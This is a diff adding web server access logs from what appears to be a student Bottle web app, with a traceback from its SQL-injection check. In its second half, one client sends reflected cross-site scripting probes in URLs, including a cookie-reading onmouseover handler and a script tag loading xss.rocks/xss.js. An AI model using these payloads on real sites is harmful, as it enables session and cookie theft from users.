@@ -25853,3 +25853,108 @@ Traceback (most recent call last):
     self.raw_requestline = self.rfile.readline(65537)
   File "/usr/lib64/python3.6/socket.py", line 586, in readinto
     return self._sock.recv_into(b)
+Bottle v0.12.18 server starting up (using WSGIRefServer())...
+Listening on http://10.86.163.196:80/
+Hit Ctrl-C to quit.
+
+10.48.69.79 - - [12/May/2020 14:59:32] "GET / HTTP/1.1" 200 2800
+10.48.69.79 - - [12/May/2020 14:59:32] "GET /img/cropped.png HTTP/1.1" 200 19060
+10.48.70.110 - - [12/May/2020 14:59:34] "GET / HTTP/1.1" 200 10110
+10.48.70.110 - - [12/May/2020 14:59:36] "GET /signout HTTP/1.1" 200 2800
+10.48.69.79 - - [12/May/2020 14:59:37] "GET / HTTP/1.1" 200 2800
+10.48.69.79 - - [12/May/2020 14:59:37] "GET /img/cropped.png HTTP/1.1" 200 19060
+10.48.70.110 - - [12/May/2020 14:59:42] "POST / HTTP/1.1" 200 1356
+10.48.70.110 - - [12/May/2020 14:59:45] "GET /signout HTTP/1.1" 200 2800
+10.48.70.110 - - [12/May/2020 14:59:59] "GET /sign-up HTTP/1.1" 200 3914
+10.48.69.79 - - [12/May/2020 15:01:28] "POST / HTTP/1.1" 200 969
+10.48.69.79 - - [12/May/2020 15:01:30] "GET / HTTP/1.1" 200 2800
+10.48.69.79 - - [12/May/2020 15:01:33] "GET /sign-up HTTP/1.1" 200 3914
+10.48.69.79 - - [12/May/2020 15:01:33] "GET /img/cropped.png HTTP/1.1" 304 0
+10.48.69.79 - - [12/May/2020 15:01:42] "POST / HTTP/1.1" 200 969
+10.48.69.79 - - [12/May/2020 15:01:45] "GET / HTTP/1.1" 200 2800
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.6/site-packages/bottle.py", line 868, in _handle
+    return route.call(**args)
+  File "/usr/local/lib/python3.6/site-packages/bottle.py", line 1748, in wrapper
+    rv = callback(*a, **ka)
+  File "run.py", line 56, in do_login
+    return model.login_check(username, password)
+  File "/home/rh/m14AGroup6/model.py", line 30, in login_check
+    result = studhelp_dbsql.check_login(username, password)
+  File "/home/rh/m14AGroup6/studhelp_dbsql.py", line 28, in check_login
+    sqli = sqli_check(args)
+  File "/home/rh/m14AGroup6/studhelp_dbsql.py", line 10, in sqli_check
+    if arg[0] == "'":
+IndexError: string index out of range
+10.48.69.79 - - [12/May/2020 15:01:47] "POST / HTTP/1.1" 500 740
+10.48.69.79 - - [12/May/2020 15:01:53] "POST / HTTP/1.1" 200 1356
+10.48.69.79 - - [12/May/2020 15:01:53] "GET /img/cropped.png HTTP/1.1" 304 0
+10.48.69.79 - - [12/May/2020 15:01:55] "GET /signout HTTP/1.1" 200 2800
+10.48.69.79 - - [12/May/2020 15:02:01] "POST / HTTP/1.1" 200 969
+10.48.69.79 - - [12/May/2020 15:02:08] "GET /sign-up HTTP/1.1" 200 3914
+10.48.69.79 - - [12/May/2020 15:02:19] "POST /sign-up HTTP/1.1" 200 2800
+10.48.69.79 - - [12/May/2020 15:02:20] "GET /img/cropped.png HTTP/1.1" 304 0
+10.48.69.79 - - [12/May/2020 15:02:25] "POST / HTTP/1.1" 200 1356
+10.48.69.79 - - [12/May/2020 15:02:27] "GET /signout HTTP/1.1" 200 2800
+10.48.69.79 - - [12/May/2020 15:02:28] "GET /sign-up HTTP/1.1" 200 3914
+10.48.69.79 - - [12/May/2020 15:02:35] "POST /sign-up HTTP/1.1" 200 1305
+10.48.69.79 - - [12/May/2020 15:02:38] "GET /sign-up HTTP/1.1" 200 3914
+10.48.69.79 - - [12/May/2020 15:02:45] "POST /sign-up HTTP/1.1" 200 2800
+10.48.69.79 - - [12/May/2020 15:02:45] "GET /img/cropped.png HTTP/1.1" 304 0
+10.48.3.166 - - [12/May/2020 15:02:47] "GET / HTTP/1.1" 200 2800
+10.48.69.79 - - [12/May/2020 15:02:51] "POST / HTTP/1.1" 200 9995
+10.48.69.79 - - [12/May/2020 15:02:51] "GET /img/john_doe.jpg HTTP/1.1" 200 7484
+10.48.69.79 - - [12/May/2020 15:02:57] "GET /messages HTTP/1.1" 200 9298
+10.48.69.79 - - [12/May/2020 15:02:59] "GET / HTTP/1.1" 200 9995
+10.48.3.166 - - [12/May/2020 15:03:02] "GET / HTTP/1.1" 200 2800
+10.48.69.79 - - [12/May/2020 15:03:04] "GET /signout HTTP/1.1" 200 2800
+10.48.69.79 - - [12/May/2020 15:03:10] "POST / HTTP/1.1" 200 969
+10.48.69.79 - - [12/May/2020 15:03:13] "POST / HTTP/1.1" 200 969
+10.48.69.79 - - [12/May/2020 15:03:19] "GET /sign-up HTTP/1.1" 200 3914
+10.48.69.79 - - [12/May/2020 15:03:19] "GET /img/cropped.png HTTP/1.1" 304 0
+10.48.69.79 - - [12/May/2020 15:03:27] "GET / HTTP/1.1" 200 2800
+10.48.3.166 - - [12/May/2020 15:03:31] "GET / HTTP/1.1" 200 2800
+10.48.69.79 - - [12/May/2020 15:03:38] "POST / HTTP/1.1" 200 9995
+10.48.69.79 - - [12/May/2020 15:03:38] "GET /img/john_doe.jpg HTTP/1.1" 304 0
+10.48.69.79 - - [12/May/2020 15:03:47] "GET /homepage/Not%20Initalised HTTP/1.1" 200 10147
+10.48.69.79 - - [12/May/2020 15:03:47] "GET /img/cropped.png HTTP/1.1" 304 0
+10.48.69.79 - - [12/May/2020 15:03:57] "GET /homepage/Not%20Initalisedd HTTP/1.1" 200 10151
+10.48.69.79 - - [12/May/2020 15:04:00] "GET /homepage/Not%20Initaliseddddd HTTP/1.1" 200 10163
+10.48.69.79 - - [12/May/2020 15:04:30] "GET /homepage/%3Cscript%3Ewindow.alert(%22WOOT%20WOOT%20WOOT%22)%3C/script%3E HTTP/1.1" 404 969
+10.48.69.79 - - [12/May/2020 15:04:41] "GET /homepage/Not%20/%3Ca%20onmouseover=alert(document.cookie)/%3Exxs%20link/%3C/a/%3E HTTP/1.1" 404 969
+10.48.69.79 - - [12/May/2020 15:04:44] "GET /homepage/Not%20Initaliseddddd%3C HTTP/1.1" 200 10179
+10.48.69.79 - - [12/May/2020 15:04:44] "GET /img/cropped.png HTTP/1.1" 304 0
+10.48.69.79 - - [12/May/2020 15:04:44] "GET /img/john_doe.jpg HTTP/1.1" 304 0
+10.48.69.79 - - [12/May/2020 15:04:49] "GET /homepage/Not%20Initaliseddddd%3Cscript? HTTP/1.1" 200 10203
+10.48.69.79 - - [12/May/2020 15:04:52] "GET /homepage/Not%20Initaliseddddd%3Cscript%3E HTTP/1.1" 200 10219
+10.48.69.79 - - [12/May/2020 15:05:00] "GET /homepage/Not%20Initaliseddddd%3Cscript%3Ewindow.alert HTTP/1.1" 200 10267
+10.48.69.79 - - [12/May/2020 15:05:06] "GET /homepage/Not%20Initaliseddddd%3Cscript%3Ewindow.alert( HTTP/1.1" 200 10271
+10.48.69.79 - - [12/May/2020 15:05:10] "GET /homepage/Not%20Initaliseddddd%3Cscript%3Ewindow.alert(%22WOOT HTTP/1.1" 200 10311
+10.48.69.79 - - [12/May/2020 15:05:13] "GET /homepage/Not%20Initaliseddddd%3Cscript%3Ewindow.alert(%22WOOT%22) HTTP/1.1" 200 10339
+10.48.69.79 - - [12/May/2020 15:05:21] "GET /homepage/Not%20Initaliseddddd%3Cscript%3Ewindow.alert(%22WOOT%22)%3C/scrip HTTP/1.1" 404 969
+10.48.69.79 - - [12/May/2020 15:05:23] "GET /homepage/Not%20Initaliseddddd%3Cscript%3Ewindow.alert(%22WOOT%22)%3C/ HTTP/1.1" 404 969
+10.48.69.79 - - [12/May/2020 15:05:26] "GET /homepage/Not%20Initaliseddddd%3Cscript%3Ewindow.alert(%22WOOT%22)%3C HTTP/1.1" 200 10355
+10.48.69.79 - - [12/May/2020 15:05:26] "GET /img/john_doe.jpg HTTP/1.1" 304 0
+10.48.69.79 - - [12/May/2020 15:05:26] "GET /img/cropped.png HTTP/1.1" 304 0
+10.48.70.241 - - [12/May/2020 15:05:45] "GET / HTTP/1.1" 200 2800
+10.48.70.241 - - [12/May/2020 15:05:45] "GET /img/cropped.png HTTP/1.1" 200 19060
+10.48.70.241 - - [12/May/2020 15:05:46] "GET /favicon.ico HTTP/1.1" 404 969
+10.48.69.79 - - [12/May/2020 15:05:54] "GET /homepage/Not%20Initaliseddddd%3CIMG%20SRC=%22%20& HTTP/1.1" 200 10259
+10.48.70.241 - - [12/May/2020 15:06:11] "POST / HTTP/1.1" 200 1356
+10.48.70.241 - - [12/May/2020 15:06:15] "GET /signout HTTP/1.1" 200 2800
+10.48.69.79 - - [12/May/2020 15:06:33] "GET /homepage/Not%20Initaliseddddd%3Cscript%3Ewindow.alert(%22WOOT%22)%3C%20B%20%3E HTTP/1.1" 200 10383
+10.48.69.79 - - [12/May/2020 15:06:34] "GET /img/john_doe.jpg HTTP/1.1" 304 0
+10.48.69.79 - - [12/May/2020 15:06:34] "GET /img/cropped.png HTTP/1.1" 304 0
+10.48.70.241 - - [12/May/2020 15:06:44] "POST / HTTP/1.1" 200 1356
+10.48.70.241 - - [12/May/2020 15:06:44] "GET /img/cropped.png HTTP/1.1" 304 0
+10.48.69.79 - - [12/May/2020 15:06:51] "GET /homepage/Not%20Initaliseddddd%3CSCRIPT%20SRC=http://xss.rocks/xss.js?%3C%20B%20%3E HTTP/1.1" 404 969
+10.48.69.79 - - [12/May/2020 15:06:58] "GET /homepage/Not%20Initaliseddddd%3Cscript%3Ewindow.alert(%22WOOT%22)%3C%20B%20%3EL HTTP/1.1" 200 10387
+10.48.69.79 - - [12/May/2020 15:07:02] "GET /homepage/Not%20Initaliseddddd%3Cscript%3Ewindow.alert(%22WOOT%22)%3C%20B%20%3E: HTTP/1.1" 200 10387
+10.48.69.79 - - [12/May/2020 15:07:04] "GET /homepage/Not%20Initaliseddddd%3Cscript%3Ewindow.alert(%22WOOT%22)%3C%20B%20h HTTP/1.1" 200 10371
+10.48.70.241 - - [12/May/2020 15:07:20] "GET /signout HTTP/1.1" 200 2800
+10.48.70.241 - - [12/May/2020 15:07:26] "GET /sign-up HTTP/1.1" 200 3914
+10.48.69.79 - - [12/May/2020 15:07:39] "GET /homepage/Not%20Initaliseddddd%3CIMG%20SRC=%22javascript:alert('XSS');%22%3E HTTP/1.1" 200 10411
+10.48.70.241 - - [12/May/2020 15:07:39] "POST /sign-up HTTP/1.1" 200 2800
+10.48.70.241 - - [12/May/2020 15:07:40] "GET /img/cropped.png HTTP/1.1" 304 0
+10.48.69.79 - - [12/May/2020 15:07:40] "GET /img/cropped.png HTTP/1.1" 304 0
+10.48.69.79 - - [12/May/2020 15:07:40] "GET /img/john_doe.jpg HTTP/1.1" 304 0
